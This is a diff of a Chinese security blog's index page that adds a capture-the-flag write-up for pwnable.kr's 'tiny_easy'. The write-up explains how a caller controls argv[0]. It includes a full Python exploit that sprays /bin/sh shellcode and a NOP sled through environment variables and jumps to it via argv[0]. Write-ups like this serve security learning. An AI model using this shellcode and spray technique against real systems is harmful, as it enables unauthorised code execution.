@@ -333,6 +333,164 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/01/程序执行中我们所忽略的事/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/10/01/程序执行中我们所忽略的事/" itemprop="url">程序执行中我们所忽略的事</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-01T00:13:10+08:00">
+                2017-10-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？"><a href="#1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？" class="headerlink" title="1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？"></a>1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？</h4><p>这个问题可能让绝大多数人困惑，因为我们所看到的基本上都符合这个结论。那什么情况下不符合呢？</p>
+<p>这就不得不提到我做过的pwnable.kr上的tiny_easy一题了</p>
+<blockquote>
+<p>I made a pretty difficult pwn task.<br>However I also made a dumb rookie mistake and made it too easy :(<br>This is based on real event :) enjoy.</p>
+<p>ssh <a href="mailto:tiny_easy@pwnable.kr" target="_blank" rel="external">tiny_easy@pwnable.kr</a> -p2222 (pw:guest)</p>
+</blockquote>
+<p>程序主体就一下几行:</p>
+<blockquote>
+<p>pop     eax<br>pop     edx<br>mov     edx, [edx]<br>call    edx</p>
+</blockquote>
+<p>那么eax其实是参数个数，而edx则是argv[0]所在字符串的前4位组成的32位地址</p>
+<p><strong>exp.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">jumpto = <span class="string">"\xb0\xaf\xb5\xff"</span></div><div class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></div><div class="line">nopsled = <span class="string">"\x90"</span>*<span class="number">4096</span>;</div><div class="line">payload = nopsled+shellcode</div><div class="line"></div><div class="line">myenv = &#123;&#125;</div><div class="line"><span class="comment"># Arbitrary largeish number</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">    myenv[<span class="string">"spray"</span>+str(i)] = payload</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    p = subprocess.Popen([jumpto], executable=<span class="string">"tiny_easy"</span>, env=myenv)</div><div class="line">    p.wait()</div></pre></td></tr></table></figure>
+<p>脚本很简单，利用的是类堆喷的方法。</p>
+<p>这里subprocess.Popen(args, executable=None, env=None)</p>
+<p>其实args这个list中的第一个参数是argv[0]，而执行的程序则是executable对应的elf文件。可以发现<font color="#f00">用户可以控制程序执行时argv[0]</font></p>
+<p>当然除了subprocess有这个功能，pwntools中pwnlib.tubes.process.process(<em>args</em>, <em>shell = False</em>, <em>executable = None</em>, <em>env = None</em>, <em>timeout = &#39;default&#39;</em>, <em>log_level = INFO</em>)也可以有类似的操作</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/30/shell命令解析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2033,150 +2191,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/Python的图片处理库PIL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/21/Python的图片处理库PIL/" itemprop="url">Python的图片处理库PIL</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T21:02:35+08:00">
-                2017-09-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code/" itemprop="url" rel="index">
-                    <span itemprop="name">code</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>PIL 是Python Image Library的缩写，意思即为Python的图片处理库</p>
-<p>PIL的官方文档是<a href="http://effbot.org/imagingbook/pil-index.htm" target="_blank" rel="external">http://effbot.org/imagingbook/pil-index.htm</a></p>
-<p>内容很全，也不需赘述</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2231,7 +2245,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">132</span>
+                <span class="site-state-item-count">133</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
